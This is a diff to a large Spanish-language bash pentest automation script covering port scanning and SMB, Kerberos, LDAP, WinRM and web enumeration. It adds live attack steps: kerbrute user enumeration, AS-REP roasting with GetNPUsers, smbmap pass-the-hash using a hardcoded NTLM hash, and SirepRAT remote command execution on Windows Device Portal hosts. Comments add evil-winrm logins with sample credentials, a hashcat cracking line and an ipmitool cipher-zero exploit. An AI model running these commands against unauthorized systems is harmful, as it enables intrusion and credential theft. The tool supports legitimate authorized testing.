@@ -78,7 +78,6 @@ do
             i)     FILE=$OPTARG;;
             d)     DOMINIO=$OPTARG;;
             m)     MODE=$OPTARG;;
-            o)     OFFSEC=$OPTARG;;
             ?)     printf "Opcion invalida: -$OPTARG\n" $0
                           exit 2;;
            esac
@@ -89,7 +88,6 @@ SUBNET_FILE=${SUBNET_FILE:=NULL}
 FILE=${FILE:=NULL}
 MODE=${MODE:=NULL}
 DOMINIO=${DOMINIO:=NULL}
-OFFSEC=${OFFSEC:=NULL}
 
 #if [ $TYPE = NULL ] ; then
 #if [[ $TYPE == NULL] || [ $DOMINIO == NULL ]]; then
@@ -235,11 +233,12 @@ echo -e "\t Date: $date  \n" | tee -a reportes/info.txt
 # Using ip list   
 if [ $FILE != NULL ] ; then  
 	#Lista de IPs como parametro (generalmente IPs publicas/subdominios) separadas por ,
-     echo -e  "[+] Usando  archivo : $FILE " 
+     echo -e  "[+] Usando  archivo : $prefijo$FILE " 
+	 #pwd
      if [ ! -f $prefijo$FILE ]; then
 		echo -e  "$OKRED El archivo no existe ! $RESET"
 		exit
-	 fi	
+	 fi
      
      cat $prefijo$FILE | cut -d "," -f 3 | sort | uniq > $live_hosts        
 else
@@ -522,7 +521,7 @@ echo -e "#################### Escaneo de puertos TCP ######################"
 if [[ $port_scanner = "naabu" ]] || [ $port_scanner == "nmap_naabu" ]; then 
 	echo "USANDO NAABU COMO PORT SCANNER"
 	echo -e "[+] Realizando escaneo de puertos especificos (informix, Web services)"  
-	naabu -list $live_hosts -p 21,22,23,110,80,443,8080,81,32764,82,83,84,85,37777,5432,3306,1525,1530,1526,1433,8728,1521,6379,27017,8291,11211,5985,47001,5986 -c 5 -o .escaneo_puertos/tcp-especificos.txt
+	naabu -list $live_hosts -p 11211,1433,1521,1525,1526,1530,17001,27017,3269,32764,37777,464,47001,49664,49665,49666,49667,49669,49676,49677,49684,49706,49915,5432,593,5985,5986,6379,81,82,8291,83,84,85,8728 -c 5 -o .escaneo_puertos/tcp-especificos.txt
 
 
 
@@ -540,13 +539,13 @@ fi
 if [[ $port_scanner = "nmap" ]] || [ $port_scanner == "nmap_masscan" ] || [ $port_scanner == "nmap_naabu" ]; then 
 	echo "USANDO NMAP COMO PORT SCANNER" 
 	echo -e "[+] Realizando escaneo de puertos especificos (informix, Web services)"  			
-	nmap -iL  $live_hosts -Pn -p 81,32764,82,83,84,85,37777,5432,1525,1530,1526,1433,8728,1521,6379,27017,8291,11211,17001,464,593,3269,49664,49665,49666,49667,49669,49676,49677,49684,49706,49915 -oG .escaneo_puertos/tcp-especificos-nmap.grep
+	nmap -iL  $live_hosts -Pn -p 11211,1433,1521,1525,1526,1530,17001,27017,3269,32764,37777,464,47001,49664,49665,49666,49667,49669,49676,49677,49684,49706,49915,5432,593,5985,5986,6379,81,82,8291,83,84,85,8728 -oG .escaneo_puertos/tcp-especificos-nmap.grep
 	 
 	# parsear salida nmap  --> 200.87.68.149:443 
 	egrep -v "^#|Status: Up" .escaneo_puertos/tcp-especificos-nmap.grep | cut -d' ' -f2,4- | sed -n -e 's/Ignored.*//p'  | awk '{for(i=2; i<=NF; i++) { a=a" "$i; }; split(a,s,","); for(e in s) { split(s[e],v,"/"); printf "%s:%s\n" , $1, v[1]}; a="" }' | sed 's/ //g'  >>  .escaneo_puertos/tcp-especificos.txt
 		
 	echo -e "[+] Realizando escaneo tcp (solo 1000 puertos)" 			
-	nmap -iL -Pn  $live_hosts -oG .escaneo_puertos/tcp-1000-nmap.grep
+	nmap -Pn -iL  $live_hosts -oG .escaneo_puertos/tcp-1000-nmap.grep
 	egrep -v "^#|Status: Up" .escaneo_puertos/tcp-1000-nmap.grep | cut -d' ' -f2,4- | sed -n -e 's/Ignored.*//p'  | awk '{for(i=2; i<=NF; i++) { a=a" "$i; }; split(a,s,","); for(e in s) { split(s[e],v,"/"); printf "%s:%s\n" , $1, v[1]}; a="" }' | sed 's/ //g'  >>  .escaneo_puertos/tcp-ports.txt
 fi
 
@@ -710,10 +709,13 @@ grep ":32764$" tcp.txt  >> ../servicios/backdoor32764.txt
 #pptp
 grep ":1723$" tcp.txt  >> ../servicios/pptp.txt
 
-grep ":5985$" tcp.txt  >> ../servicios/WinRM.txt
 grep ":47001$" tcp.txt  >> ../servicios/WinRM.txt
-grep ":5986$" tcp.txt  >> ../servicios/WinRM.txt
 
+grep ":5985$" tcp.txt  >> ../servicios/WinRM.txt
+#evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
+grep ":5986$" tcp.txt  >> ../servicios/WinRM-ssl.txt
+# openssl req -newkey rsa:2048 -nodes -keyout request.key -out request.csr
+# evil-winrm -i 10.10.10.103 -c certnew.cer -k request.key --port 5986 --ssl
 grep ":9389$" tcp.txt  >> ../servicios/RSAT.txt
 	
 	
@@ -986,6 +988,9 @@ then
 	interlace -tL servicios/smb_uniq.txt -threads 5 -c "echo 'smbmap -u Administrator -p aad3b435b51404eeaad3b435b51404ee:e101cbd92f05790d1a202bf91274f2e7 -H _target_ '  >> logs/vulnerabilidades/_target__445_compartidoSMB.txt 2>/dev/null" --silent
 	interlace -tL servicios/smb_uniq.txt -threads 5 -c "smbmap -u Administrator -p aad3b435b51404eeaad3b435b51404ee:e101cbd92f05790d1a202bf91274f2e7 -H _target_ 2>/dev/null" --silent
 	
+	interlace -tL servicios/smb_uniq.txt -threads 5 -c 'echo smbclient --list //_target_/ -U > logs/vulnerabilidades/_target__445_compartidoSMBClient.txt 2>/dev/null' --silent
+	interlace -tL servicios/smb_uniq.txt -threads 5 -c 'smbclient --list //_target_/ -U " "%" " >> logs/vulnerabilidades/_target__445_compartidoSMBClient.txt 2>/dev/null' --silent
+	
 fi
 
 if [ -f servicios/smb.txt ]
@@ -1008,6 +1013,7 @@ then
 		grep ":" logs/vulnerabilidades/"$ip"_445_nullsession.txt  > .vulnerabilidades/"$ip"_445_nullsession.txt 
 		grep --color=never "not required" logs/vulnerabilidades/"$ip"_445_smb2Security.txt > .vulnerabilidades/"$ip"_445_smb2Security.txt
 		egrep --color=never "READ|WRITE" logs/vulnerabilidades/"$ip"_445_compartidoSMB.txt | sort | uniq | grep -v '\$' > .vulnerabilidades/"$ip"_445_compartidoSMB.txt		
+		egrep --color=never "Disk" logs/vulnerabilidades/"$ip"_445_compartidoSMBClient.txt | sort | uniq | grep -v '\$' > .vulnerabilidades/"$ip"_445_compartidoSMBClient.txt		
 		################################										
 	done				
 	
@@ -1096,7 +1102,7 @@ then
 		echo -e "\t[+] Probando vulnerabilidad cipher-zero"
 		echo "nmap -sU --script ipmi-cipher-zero -p 623 -Pn -n $ip"  > logs/vulnerabilidades/"$ip"_"$port"_cipherZeroIPMI.txt 2>/dev/null 
 		nmap -sU --script ipmi-cipher-zero -p $port -Pn -n $ip >> logs/vulnerabilidades/"$ip"_"$port"_cipherZeroIPMI.txt 2>/dev/null 
-		grep "|" logs/vulnerabilidades/"$ip"_"$port"_cipherZeroIPMI.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR" > .vulnerabilidades/"$ip"_"$port"_cipherZeroIPMI.txt 	
+		grep "|" logs/vulnerabilidades/"$ip"_"$port"_cipherZeroIPMI.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|filtered" > .vulnerabilidades/"$ip"_"$port"_cipherZeroIPMI.txt 	
 		
 		#exploit
 		#ipmitool -I lanplus -C 0 -H 192.168.200.5 -U admin -P root user list 
@@ -1732,7 +1738,7 @@ then
 		###### Enum4linux ######
 		echo "enum4linux $ip 2>/dev/null | grep -iv \"unknown\"" > logs/vulnerabilidades/"$ip"_445_enum4linux.txt 
 		enum4linux $ip 2>/dev/null | grep -iv "unknown" >> logs/vulnerabilidades/"$ip"_445_enum4linux.txt 
-		grep --color=never "Local User" logs/vulnerabilidades/"$ip"_445_enum4linux.txt  > .vulnerabilidades/"$ip"_445_enum4linux.txt
+		grep --color=never -i  "User" logs/vulnerabilidades/"$ip"_445_enum4linux.txt  > .vulnerabilidades/"$ip"_445_enum4linux.txt
 		#######################
 		
 		
@@ -1774,7 +1780,7 @@ then
 		echo $dnsHostName > .enumeracion/"$ip"_"$port"_dnsHostName.txt			
 		echo $dominioAD > .enumeracion/"$ip"_"$port"_dominio.txt		
 		###### LDAP ######
-		if [ -z "$dominio" ]; then			
+		if [ -z "$dominioAD" ]; then			
 			echo -e "\t[i] No se pudo obtener el dominio "
 		else
 			echo -e "\t[+] Probando vulnerabilidad de conexión anónima con el dominio $dominio"
@@ -1809,16 +1815,20 @@ then
         ip=`echo $line | cut -f1 -d":"`
 		port=`echo $line | cut -f2 -d":"` 	
 		
-		echo -e "[+] Escaneando $ip:$port"			
-		echo -e "[+] \t keybrute"	
-		kerbrute userenum $common_user_list --dc $ip -d $dominioAD > logs/vulnerabilidades/"$ip"_"$port"_kerbrute.txt
-		grep "VALID USERNAME" logs/vulnerabilidades/"$ip"_"$port"_kerbrute.txt > .vulnerabilidades/"$ip"_"$port"_kerbrute.txt
+		echo -e "[+] Escaneando $ip:$port"	
+		#DC=htb,DC=local		
+		dominioAD=`echo "${dominioAD/,DC=/.}"`
+		dominioAD=`echo "${dominioAD/DC=/}"`
+
+		echo -e "[+] \t kerbrute ($dominioAD)"	
+		kerbrute userenum $common_user_list --dc $ip -d $dominioAD --output logs/vulnerabilidades/"$ip"_"$port"_kerbrute.txt
+		grep "VALID USERNAME" logs/vulnerabilidades/"$ip"_"$port"_kerbrute.txt | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g"  > .vulnerabilidades/"$ip"_"$port"_kerbrute.txt
 		
 		GetNPUsers.py "$dominioAD"/ -no-pass -usersfile $common_user_list -format hashcat -dc-ip $ip > logs/vulnerabilidades/"$ip"_"$port"_kerberosHash.txt
 		grep "krb5as" logs/vulnerabilidades/"$ip"_"$port"_kerberosHash.txt > .vulnerabilidades/"$ip"_"$port"_kerberosHash.txt
+		# hashcat -m 18200 -a 0 hash.txt /media/sistemas/Passwords/Passwords/rockyou2021.txt -o cracked.txt #hash.txt tiene todos los datos no solo hash
 		
-		
-		echo -e "[+] \t _rpcEnumUsers"	
+		echo -e "[+] \t rpcEnumUsers"	
 		msfconsole -x "use auxiliary/scanner/smb/smb_enumusers;set RHOSTS $ip;run;exit" > logs/enumeracion/"$ip"_"$port"_rpcEnumUsers.txt 2>/dev/null							   
 		egrep --color=never -i "Administrator" logs/enumeracion/"$ip"_"$port"_rpcEnumUsers.txt  >> .enumeracion/"$ip"_"$port"_rpcEnumUsers.txt
 		
@@ -1861,6 +1871,7 @@ if [ -f servicios/web.txt ]
 then
       
     echo -e "$OKBLUE #################### WEB (`wc -l servicios/web.txt`) ######################$RESET"	    
+	touch webClone/checksumsEscaneados.txt
     ################ Obtener Informacion tipo de servidor, CMS, framework, etc ###########3
     echo -e "$OKGREEN[i] Identificacion de técnologia usada en los servidores web$RESET"
 	for line in $(cat servicios/web.txt); do  
@@ -2353,7 +2364,7 @@ then
 
 					echo -e "\t\t[+] Revisando vulnerabilidades HTTP mixtas"
 					nmap -Pn -p $port --script=http-vuln* $ip >> logs/vulnerabilidades/"$ip"_"$port"_nmapHTTPvuln.txt
-					egrep --color=never "|" logs/vulnerabilidades/"$ip"_"$port"_nmapHTTPvuln.txt > .vulnerabilidades/"$ip"_"$port"_nmapHTTPvuln.txt
+					grep --color=never "|" logs/vulnerabilidades/"$ip"_"$port"_nmapHTTPvuln.txt > .vulnerabilidades/"$ip"_"$port"_nmapHTTPvuln.txt
 					sleep 1
 
 					#######  drupal (IP) ######
@@ -2545,7 +2556,18 @@ then
 											
 					####################################	
 			
-			
+
+					
+					egrep -iq "Windows Device Portal" .enumeracion/"$ip"_"$port"_webData.txt 
+					greprc=$?
+					if [[ $greprc -eq 0 && ! -f .enumeracion/"$ip"_"$port"_webarchivos.txt  ]];then # si el banner es Apache y no se enumero antes				
+						echo -e "\t\t[+] Revisando SirepRAT ($ip)"
+						SirepRAT.sh $ip LaunchCommandWithOutput --return_output --cmd 'c:\windows\System32\cmd.exe' --args '/c ipconfig' --v >> logs/vulnerabilidades/"$ip"_"$port"_SirepRAT.txt
+						grep -ia 'IPv4' logs/vulnerabilidades/"$ip"_"$port"_SirepRAT.txt > .vulnerabilidades/"$ip"_"$port"_SirepRAT.txt
+
+					fi
+
+
 					#######  if the server is apache ######
 					egrep -i "apache|nginx|kong" .enumeracion/"$ip"_"$port"_webData.txt | egrep -qiv "cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|NodeJS|Nextcloud|Open Source Routing Machine|ownCloud|Cloudflare" # solo el segundo egrep poner "-q"
 					greprc=$?
@@ -3455,6 +3477,8 @@ then
 fi
 
 
+
+
 cd webClone
 	echo -e "[+] Extrayendo URLs de todos los sitios clonados"
 	grep --color=never -irao "http://[^ ]*"  * 2>/dev/null | cut -d ":" -f3 | grep --color=never -ia "$DOMINIO" | grep -v '\?'| cut -d "/" -f3-4 | egrep -iv "galeria|images|plugin" | sort | uniq > http.txt
@@ -3721,8 +3745,8 @@ then
 		port=`echo $line | cut -f2 -d":"`
 		
 		echo -e "[+] Escaneando vulnerabilidades $ip:$port"		
-		nmap -Pn -sU -p 69 --script tftp-enum.nse $ip  > logs/enumeracion/"$ip"_tftp_enum.txt 2>/dev/null
-		grep "|" logs/enumeracion/"$ip"_"$port"_ftp_vuln.txt > .enumeracion/"$ip"_"$port"_tftp_enum.txt	
+		nmap -Pn -sU -p 69 --script tftp-enum.nse $ip  > logs/enumeracion/"$ip"_"$port"_tftp_enum.txt  2>/dev/null
+		grep "|" logs/enumeracion/"$ip"_"$port"_tftp_enum.txt | grep -v "filtered" > .enumeracion/"$ip"_"$port"_tftp_enum.txt	
 				
 	done		
 	
@@ -3738,7 +3762,7 @@ then
 		port=`echo $line | cut -f2 -d":"`
 		
 		echo -e "[+] Escaneando vulnerabilidades $ip:$port"		
-		nmap -n -sT -sV -Pn -p $port $ip --script=ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp_vuln-cve2010-4221 > logs/vulnerabilidades/"$ip"_ftp_vuln.txt 2>/dev/null
+		nmap -n -sT -sV -Pn -p $port $ip --script=ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp_vuln-cve2010-4221 > logs/vulnerabilidades/"$ip"_"$port"_ftp_vuln.txt 2>/dev/null
 		grep "|" logs/vulnerabilidades/"$ip"_"$port"_ftp_vuln.txt > .vulnerabilidades/"$ip"_"$port"_ftp_vuln.txt	
 		
 		echo -e "\t[+] Obtener banner"	
@@ -4978,7 +5002,7 @@ done	# done true
 ##########  Filtrar los directorios que respondieron 200 OK (llevarlos a .enumeracion) ################
 echo -e "$OKBLUE [i] Filtrar los directorios descubiertos que respondieron 200 OK (llevarlos a .enumeracion) $RESET"	    
 touch logs/enumeracion/canary_webdirectorios.txt # se necesita al menos 2 archivos *_webdirectorios.txt
-egrep --color=never "^200" logs/enumeracion/*webdirectorios.txt 2>/dev/null| while read -r line ; do	
+egrep --color=never "^200|^401" logs/enumeracion/*webdirectorios.txt 2>/dev/null| while read -r line ; do	
 	#echo -e  "$OKRED[!] Listado de directorio detectado $RESET"		
     archivo_origen=`echo $line | cut -d ':' -f1`
     contenido=`echo $line | cut -d ':' -f2-6`    
